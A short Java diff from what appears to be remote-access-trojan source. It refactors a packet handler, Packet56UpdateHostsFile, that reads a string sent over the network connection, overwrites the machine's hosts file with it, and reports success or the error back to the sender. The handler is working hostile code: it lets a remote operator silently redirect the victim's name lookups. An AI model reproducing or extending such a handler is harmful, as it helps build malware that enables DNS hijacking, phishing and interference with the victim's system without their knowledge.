@@ -12,7 +12,7 @@ public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String str = Connection.readLine();
+		String str = Connection.instance.readLine();
 
 		File file = null;
 
@@ -29,9 +29,9 @@ public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 				FileWriter writer = new FileWriter(file);
 				writer.write(str);
 				writer.close();
-				Connection.addToSendQueue(new Packet39HostEditResult(""));
+				Connection.instance.addToSendQueue(new Packet39HostEditResult(""));
 			} catch (Exception ex) {
-				Connection.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
+				Connection.instance.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
 			}
 		}
 	}
